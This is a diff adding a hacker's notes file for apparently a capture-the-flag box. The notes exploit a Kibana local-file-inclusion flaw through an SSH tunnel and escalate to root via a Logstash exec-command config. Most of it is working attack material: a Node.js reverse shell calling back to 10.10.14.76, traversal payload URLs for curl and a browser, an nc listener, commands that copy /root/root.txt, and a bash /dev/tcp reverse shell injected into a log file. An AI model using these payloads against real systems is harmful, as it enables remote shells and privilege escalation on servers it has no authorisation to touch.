@@ -1,0 +1,102 @@
+#lfi first step to kibana
+https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
+
+#rev shell: the ip is the vpn ip and the port is w.e
+#https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(7000, "10.10.14.76", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+#localhost:9999 opens kibana
+ssh -L 9999:localhost:5601: security@10.10.10.115
+
+#ssh -L AAAAAA:BBBBBBB:CCCCCCC:DDDDDD@EEEEEEEEE
+A:  my local port
+B:  an ip accessed by the remote host of creds given as D@E
+C:  port accessed by B
+D:  user
+E:  remote ip target
+so.... on my localhost:A access B:C as if I were D@E
+
+# listen on the port
+nc -lvp PORT_IN_JS
+
+# can visit page in browser or curl to cause LFI execution
+# need a new .js file each time used
+# browser
+http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.krs2.js
+# curl
+curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
+
+#.conf files
+input {
+        file {
+                path => "/opt/kibana/logstash_*"
+                #         ^ execute commands in these files
+                #           must have syntas:
+                #           Ejecutar comando: <any command>
+                start_position => "beginning"
+                sincedb_path => "/dev/null"
+                stat_interval => "10 second"
+                type => "execute"
+                mode => "read"
+        }
+}
+
+output {
+        if [type] == "execute" {
+                stdout { codec => json }
+                exec {
+                        command => "%{comando} &"
+                }
+        }
+}
+
+filter {
+        if [type] == "execute" {
+                grok {
+                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+                }
+        }
+}
+
+
+#starts kibana
+/usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
+
+#notes:
+# this sol creates a file of the root.txt we need
+# a better soln will create an interactive shell.
+
+# curl to get remote and listen on nc port
+curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
+
+#locations of junk
+yml       : /etc/kibana && /etc/logstash
+logstash_*: /opt/kibana/
+*.conf    : /etc/logstash/conf.d
+logs      : /var/log/logstash
+
+# copy/paste when kibana: it seems to take ~30 minutes for the conf files to be
+# read. Also, maybe have to modify the conf files to trigger.
+# THIS DOESNT WORK... THEY HAVE SAFEGUARDS AND YOU MUST SET UP A REVERSE SHELL...
+#cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
+#echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
+#echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
+#echo "Ejecutar comando : rm /tmp/.test.txt" >> /opt/kibana/logstash_0
+
+# need to reverse shell
+# https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
+# bash -i >& /dev/tcp/ip/port 0>&1
+echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.76/7001 0>&1" >> /opt/kibana/logstash_0
+
+rooted!
